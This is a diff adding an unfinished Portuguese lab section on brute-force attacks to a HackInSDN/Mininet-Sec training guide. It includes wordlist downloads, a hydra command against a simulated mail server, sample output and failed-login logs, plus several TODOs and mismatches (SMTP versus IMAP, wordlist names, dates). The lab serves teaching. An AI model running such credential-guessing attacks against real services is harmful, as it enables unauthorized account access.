@@ -454,7 +454,82 @@ Observe que o host 172.16.40.1 é listado como vulnerável ao ataque. De fato, e
 
 ## Atividade 3 - Ataques de brute-force
 
-TODO
+Ataques de brute-force são ataques contra o mecanismo de autenticação em que o atacante executa diversas testes de autenticação para obter credenciais válidas na "força bruta", ou seja, na tentativa e erro. Os testes de autenticação podem ser baseados em um conjunto de usuários e senhas candidados (também conhecido como *wordlist* ou ataque de dicionário) ou podem ser baseados em valores (pseudo-)aleatórios (exemplo: senha120, senha121, senha122, senha123, ...) -- dizemos pseudo-aleatórios pois o processo de geração de valores pode ser melhorado com heurísticas que aumentam as chances de sucesso. Os ataques de brute-force podem ainda ter como alvo sistemas online ou ainda hashes de senhas que vazaram e, eventualmente, pode ser quebrabas (para obter a entrada que gerou o hash). Nesta atividade vamos mostrar ataques de brute-force contra sistemas online.
+
+### 3.1 Download de dicionários e regras de geração de senhas
+
+O primeiro passo é fazer o download de um dicionário de usuários (logins) e senhas para aumentar a efetividade do ataque. Nesta atividade disponibilizamos dicionários curtos para realização da prática.
+
+O primeiro passo é fazer o download dos dicionários. Para isso, acesso o terminal do Mininet-Sec a partir do Dashboard HackInSDN:
+
+![abrir mininet-sec terminal](https://raw.githubusercontent.com/hackinsdn/labs/refs/heads/main/lab01-scan-brute_force-dos/images/abrir-mnsec-terminal.png)
+
+Em seguida, no terminal do Mininet-Sec, execute os seguintes comandos:
+```
+cd /tmp
+curl -LO https://raw.githubusercontent.com/hackinsdn/labs/refs/heads/main/lab01-scan-brute_force-dos/wordlist-password.txt
+curl -LO https://raw.githubusercontent.com/hackinsdn/labs/refs/heads/main/lab01-scan-brute_force-dos/wordlist-login.txt
+```
+
+Ainda no terminal do Mininet-Sec, faça também o download de um arquivo de regras para geração de senhas que são muito úteis para expandir o dicionário com combinações tipicamente adotadas pelos usuários:
+```
+cd /tmp
+curl -LO https://raw.githubusercontent.com/NotSoSecure/password_cracking_rules/refs/heads/master/OneRuleToRuleThemAll.rule
+```
+
+### 3.2 Ataques de força-bruta contra o SMTP, IMAP e SSH
+
+Para visualizar o ataque de força bruta ocorrendo, abra o terminal do host srv102 e execute o seguinte comnado para monitorar o log das aplicações:
+```
+tail -f /tmp/mnsec/srv102/log/smtp.log
+```
+
+O comando acima irá exibir mensagens de log relacionadas a falhas de login.
+
+De volta ao terminal do Mininet-sec, vamos utilizar o aplicativo **mnsecx** (mininet-sec exec) para executar comandos em nós específicos da topologia. Por exemplo, para executar o ataque de brute-force a partir do host h401, execute o seguinte comando no Terminal do Mininet-Sec:
+```
+mnsecx h401 hydra -I -L /tmp/wordlist-login.txt -P /tmp/wordlist-password.txt smtp://172.16.10.2/CLEAR
+```
+
+O comando acima inicializará um ataque de força bruta contra o serviço IMAP que está em execução no srv102 (172.16.10.2). Após executar o ataque você deve visualizar uma saída como mostrado abaixo:
+```
+root@h401:~# hydra -I -L /tmp/wordlist-username.txt -P /tmp/wordlist-password.txt imap://172.16.10.2/CLEAR
+Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-11-20 20:26:12
+[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 315 login tries (l:15/p:21), ~20 tries per task
+[DATA] attacking imap://172.16.10.2:143/CLEAR
+1 of 1 target completed, 0 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-12-24 20:26:18
+```
+
+No terminal do srv102, você deve visualizar as tentativas de conexão:
+```
+root@srv102:~# tail -f /tmp/mnsec/srv102/log/*.log
+==> /tmp/mnsec/srv102/log/imap.log <==
+{"action": "login", "dest_ip": "0.0.0.0", "dest_port": "143", "password": "teste123!#", "server": "imap_server", "src_ip": "192.168.40.1", "src_port": "53138", "status": "failed", "timestamp": "2024-11-20T20:26:16.104778", "username": "user"}
+{"action": "login", "dest_ip": "0.0.0.0", "dest_port": "143", "password": "ninja", "server": "imap_server", "src_ip": "192.168.40.1", "src_port": "53150", "status": "failed", "timestamp": "2024-11-20T20:26:16.114977", "username": "user"}
+{"action": "login", "dest_ip": "0.0.0.0", "dest_port": "143", "password": "spark123", "server": "imap_server", "src_ip": "192.168.40.1", "src_port": "53156", "status": "failed", "timestamp": "2024-11-20T20:26:16.125113", "username": "user"}
+{"action": "login", "dest_ip": "0.0.0.0", "dest_port": "143", "password": "0123456789", "server": "imap_server", "src_ip": "192.168.40.1", "src_port": "53162", "status": "failed", "timestamp": "2024-11-20T20:26:16.135531", "username": "user"}
+...
+```
+
+Observe que o hydra reporta não ter encontrado nenhuma combinação de credenciais válidas. Isso ocorre pois o serviço que está configurado no srv102 para simular o IMAP responde com falha de autenticação para quaisquer combinações de usuário e senha (este é um serviço leve apenas para simular um serviço real)
+
+TODO: alterar acima pra usar SMTP
+
+TODO: iniciar o serviço SSH e realizar o ataque
+
+TODO: iniciar o serviço IMAP e realizar o ataque, mostrar sem TLS
+
+### 3.3 - Ataque de brute-force com senhas geradas dinamicamente
+
+TODO: iniciar o serviço HTTP (Basic e Form)
+
+TODO: mostrar o ataque com senha gerada a partir de conjunto de caractere
+
+TODO: mostrar ataque com hashcat e regras de geracao
 
 ## Atividade 4 - Ataques de negação de serviço
 
